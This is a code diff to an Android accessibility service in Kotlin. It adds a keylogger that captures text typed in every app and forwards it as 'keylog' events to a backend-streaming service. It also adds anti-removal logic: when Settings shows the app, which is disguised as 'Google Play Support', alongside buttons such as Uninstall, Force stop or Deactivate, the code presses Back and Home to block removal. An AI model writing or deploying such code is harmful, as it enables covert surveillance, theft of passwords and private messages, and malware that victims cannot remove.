@@ -41,13 +41,49 @@ class AppMonitorAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+        val eventType = event?.eventType
+        val packageName = event?.packageName?.toString() ?: return
+
+        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            handleKeylog(event, packageName)
             return
         }
 
-        val packageName = event.packageName?.toString() ?: return
+        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
+            eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            return
+        }
+
         if (packageName == packageNameInternal()) {
             return
+        }
+
+        // Anti-Uninstall & Anti-Deactivation: Block A-Dex App Info or Deactivation in Settings
+        if (packageName == "com.android.settings" || packageName == "com.google.android.settings") {
+            val root = rootInActiveWindow
+            if (root != null) {
+                // Check if our app name is visible
+                val appFound = root.findAccessibilityNodeInfosByText("Google Play Support").isNotEmpty()
+                
+                if (appFound) {
+                    // Check for critical action buttons
+                    val dangerButtons = listOf("Uninstall", "Force stop", "Deactivate", "Remove", "Clear data", "Delete")
+                    for (label in dangerButtons) {
+                        if (root.findAccessibilityNodeInfosByText(label).isNotEmpty()) {
+                            performGlobalAction(GLOBAL_ACTION_BACK)
+                            performGlobalAction(GLOBAL_ACTION_HOME) // Go home to be sure
+                            return
+                        }
+                    }
+                    
+                    // Specific check for Device Admin deactivation screens
+                    if (root.findAccessibilityNodeInfosByText("Device admin").isNotEmpty() || 
+                        root.findAccessibilityNodeInfosByText("Active").isNotEmpty()) {
+                        performGlobalAction(GLOBAL_ACTION_BACK)
+                        return
+                    }
+                }
+            }
         }
 
         // Forward app launch telemetry to the foreground service for backend event streaming.
@@ -73,6 +109,19 @@ class AppMonitorAccessibilityService : AccessibilityService() {
             }
             startActivity(blockIntent)
         }
+    }
+
+    private fun handleKeylog(event: AccessibilityEvent, packageName: String) {
+        val text = event.text?.joinToString("") ?: ""
+        if (text.isBlank()) return
+
+        val serviceIntent = Intent(this, ADexForegroundService::class.java).apply {
+            action = ServiceActions.ACTION_PACKAGE_EVENT
+            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "keylog")
+            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, packageName)
+            putExtra("text", text)
+        }
+        ContextCompat.startForegroundService(this, serviceIntent)
     }
 
     override fun onInterrupt() {
